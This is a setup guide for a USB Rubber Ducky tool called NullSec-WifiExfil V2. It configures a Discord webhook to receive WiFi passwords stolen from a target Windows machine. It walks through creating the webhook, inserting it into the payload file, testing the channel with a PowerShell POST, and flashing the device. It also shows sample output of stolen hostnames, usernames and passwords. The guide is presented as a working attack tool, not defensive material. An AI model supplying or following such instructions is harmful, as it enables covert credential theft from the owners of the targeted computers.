# Discord Webhook Setup Guide - NullSec-WifiExfil V2

## 📋 Step-by-Step Discord Configuration (3 minutes)

This guide walks you through creating a Discord webhook for exfiltrating WiFi credentials.

---

## Step 1: Create Discord Server (If Needed)

- Go to Discord: https://discord.com
- Create a new server or use existing
- You need **Manage Webhooks** permission in the channel

---

## Step 2: Create a Webhook

### 2.1 Open Server Settings
1. Right-click on your Discord server
2. Select **"Server Settings"** (or **"Edit Server"**)

### 2.2 Navigate to Webhooks
1. In left sidebar, scroll down to **"Integrations"**
2. Click **"Webhooks"**

### 2.3 Create New Webhook
1. Click **"New Webhook"** button (or **"Create Webhook"**)
2. Give it a name: `WifiExfil` (or any name)
3. Select channel: Choose where you want credentials posted
4. Click **"Create"**

---

## Step 3: Get Webhook URL

### 3.1 Copy Webhook URL
1. After webhook is created, click **"Copy Webhook URL"** button
2. The URL looks like:
   ```
   https://discordapp.com/api/webhooks/123456789/abcdefghijklmnop
   ```
3. Save it securely

**Full webhook URL example:**
```
https://discordapp.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz1A2b3C4d5E6f7G8h9I0j1K2l
```

---

## Step 4: Configure the Payload

### 4.1 Edit payload-discord.txt
Open the file in a text editor and find:
```
DEFINE #WEBHOOK_URL YOUR_WEBHOOK_URL_HERE
```

### 4.2 Replace with Your Webhook URL
```
DEFINE #WEBHOOK_URL https://discordapp.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz1A2b3C4d5E6f7G8h9I0j1K2l
```

**Important:** Keep the entire URL intact, including the `https://` part

---

## Step 5: Test Your Webhook

### 5.1 Test with PowerShell
Before flashing to your Ducky, test the webhook:

```powershell
# Replace with YOUR webhook URL
$webhook = 'https://discordapp.com/api/webhooks/...'

# Create test message
$payload = @{
    content = "**Test Message** `
Webhook is working! `n[$(Get-Date)]"
} | ConvertTo-Json

# Send to Discord
Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $payload

Write-Host "Check Discord channel for test message"
```

**✓ If successful:**
- Message appears in your Discord channel
- Webhook is configured correctly
- You can proceed to flash

**✗ If it fails:**
- Double-check the full webhook URL
- Verify webhook hasn't been deleted
- See [TROUBLESHOOTING.md](./TROUBLESHOOTING.md)

---

## Step 6: Flash to USB Rubber Ducky

1. Use official Ducky Flasher tool
2. Select `payload-discord.txt`
3. Flash to your Ducky
4. Test on target Windows machine
5. Check Discord channel for results

---

## Expected Discord Output

When the payload executes, you'll see a message in Discord:

```
**WiFi Credentials - DESKTOP-ABC123 (john_user)**
[2026-05-07 14:23:45]


HomeNetwork | WPA2-Personal | MySecurePassword123!
OfficeWiFi | WPA2-Enterprise | (no key)
Cafe_Guest | Open | (no key)
```

Formatting:
- `**Bold**` = Header with hostname and username
- Timestamp included
- Networks listed in code block (monospace)
- Auth type and password on each line

---

## Webhook Security Best Practices

⚠️ **Important:**

1. **Treat webhook URL like a password** - anyone with it can post to your channel
2. **Use private Discord server** - don't use public servers
3. **Restrict channel access** - only trusted people can see it
4. **Rotate webhooks regularly** - delete old ones every 30-90 days
5. **Delete if compromised** - anyone with URL can spam your channel
6. **Store securely** - don't share or commit to public repos

### How to Delete/Revoke a Webhook
1. In Discord, go to Server Settings → Integrations → Webhooks
2. Find your webhook
3. Click the **trash icon** to delete
4. Confirm deletion
5. URL will no longer work

---

## Discord Output Examples

### Example 1: Found Passwords
```
**WiFi Credentials - LAPTOP-XYZ (admin)**
[2026-05-07 15:30:12]


HomeNetwork | WPA2-Personal | SuperSecure@Password#123
Starbucks_WiFi | Open | (no key)
CompanyVPN | WPA2-Enterprise | (no key)
```

### Example 2: Minimal Networks
```
**WiFi Credentials - PC-OLD (user)**
[2026-05-07 09:15:47]


Guest | Open | (no key)
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Message doesn't appear in Discord | Check webhook URL is complete & correct |
| 404 Webhook Not Found error | Webhook was deleted - create a new one |
| 401 Unauthorized error | Wrong webhook URL |
| No credentials extracted | Target machine has no saved WiFi networks |
| Payload doesn't run | Check USB Rubber Ducky firmware |

For more help, see [TROUBLESHOOTING.md](./TROUBLESHOOTING.md)

---

## Dropbox Alternative

If you prefer direct file upload instead of Discord:
- See [DROPBOX_SETUP.md](./DROPBOX_SETUP.md)
- Use `payload-dropbox.txt` instead
- Better for long-term file storage
- More secure (private cloud storage)

---

**Your Discord webhook is ready to receive WiFi credentials!**
